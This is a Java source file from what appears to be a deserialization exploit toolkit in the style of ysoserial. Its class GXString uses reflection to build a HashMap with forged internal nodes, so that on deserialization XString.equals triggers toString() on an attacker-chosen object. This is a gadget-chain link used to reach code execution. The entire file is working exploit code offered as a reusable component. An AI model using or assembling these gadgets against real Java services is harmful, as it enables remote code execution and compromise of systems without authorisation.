package com.h2tg.ysogate.bullet.jdk;

import com.h2tg.ysogate.bullet.base.IReadObject2ToString;
import com.sun.org.apache.xpath.internal.objects.XString;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

import static com.h2tg.ysogate.utils.Reflections.setFieldValue;

public class GXString implements IReadObject2ToString
{
    @Override
    public Object readObjectToString(Object obj) throws Exception
    {
        XString xString = new XString("test");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", obj);
        map1.put("zZ", xString);

        map2.put("yy", xString);
        map2.put("zZ", obj);

        HashMap s = new HashMap();
        setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
        setFieldValue(s, "table", tbl);

        return s;
    }
}
